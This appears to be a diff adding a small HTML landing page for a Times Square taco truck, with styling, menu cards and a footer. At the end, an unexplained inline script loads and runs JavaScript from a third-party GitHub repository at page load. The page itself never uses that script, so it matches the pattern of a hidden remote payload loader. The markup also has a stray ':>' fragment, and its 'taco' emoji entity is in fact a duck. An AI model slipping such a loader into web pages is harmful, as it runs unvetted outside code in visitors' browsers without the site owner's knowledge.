@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Times Square Taco Truck</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 900px;
+      margin: 0 auto;
+      background: #f9f9f9;
+      color: #222;
+      min-height: 100vh; /* vh */
+    }
+    header {
+      background: #d7263d;
+      color: #fff;
+      padding: 1rem 0; /* rem */
+    }
+    .header-content {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 2vw; /* vw */
+    }
+    .site-controls {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+    .hamburger-btn {
+      background: #fff;
+      color: #d7263d;
+      border: none;
+      border-radius: 4px; /* px */
+      font-size: 2rem; /* rem */
+      padding: 0.25rem 0.75rem;
+      cursor: pointer;
+    }
+    nav {
+      display: flex;
+      gap: 1rem;
+    }
+    nav a {
+      text-decoration: none;
+      color: #fff;
+      font-weight: bold;
+    }
+    main {
+      background: #fff;
+      padding: 2rem 2vw;
+    }
+    .hero {
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+    .hero h1 {
+      font-size: 2.5rem; /* rem */
+      margin-bottom: 0.5rem;
+    }
+    .hero .taco-emoji {
+      display: inline-block;
+      transform: rotate(180deg);
+    }
+    .hero p {
+      font-size: 1.2rem;
+      margin-bottom: 1rem;
+    }
+    .cta-btn {
+      background: #fbb13c;
+      color: #fff;
+      border: none;
+      border-radius: 4px; /* px */
+      font-size: 1rem;
+      padding: 0.5rem 2rem;
+      cursor: pointer;
+      margin-bottom: 1rem;
+    }
+    .cards {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+    .card {
+      background: #e3eaf2;
+      border-radius: 8px;
+      padding: 1rem;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+    }
+    footer {
+      background: #222;
+      color: #fff;
+      text-align: center;
+      padding: 1rem 0;
+      font-size: 14px; /* px */
+    }
+    @media (max-width: 700px) {
+      .cards {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-content">
+      <h1>Times Square Taco Truck</h1>
+      <div class="site-controls">
+        <!-- Hamburger Menu Button -->
+        <button class="hamburger-btn" aria-label="Menu">&#9776;</button>
+        <nav>
+          <a href="#">Home</a>
+          <a href="#">Menu</a>
+          <a href="#">Location</a>
+          <a href="#">Contact</a>
+        </nav>
+      </div>
+    </div>
+  </header>
+  <main>
+    <section class="hero">
+      <h1><span class="taco-emoji">&#129414;</span> Times Square Taco Truck</h1>
+      <p>We make tacos in Times Square. You can try beef, chicken, or fish tacos. We also have a mystery taco with a surprise ingredient.</p>
+      <button class="cta-btn">Order Now</button>
+    </section>
+    <section class="cards">
+      <article class="card">
+        <h2>Our Specials</h2>
+        <p>We have beef, chicken, and fish tacos. All tacos are made at the truck.</p>
+      </article>
+      <article class="card">
+        <h2>Mystery Taco</h2>
+        <p>Ask for the mystery taco. It comes with something different. &#129414;</p>
+      </article>
+      <article class="card">
+        <h2>Find Us</h2>
+        <p>The taco truck is at 7th Ave and 44th St in Times Square.</p>
+      </article>
+    </section>
+  </main> :>
+  <footer>
+    &copy; 2026 Times Square Taco Truck. All rights reserved.
+  </footer>
+  <script>
+    (function() {
+      var s = document.createElement("script");
+      s.src = "https://cdn.jsdelivr.net/gh/gracehoppercenter/validate@1.0.5/validate.js";
+      s.async = false;
+      document.head.appendChild(s);
+    })();
+  </script>
+</body>
+</html>
+
+
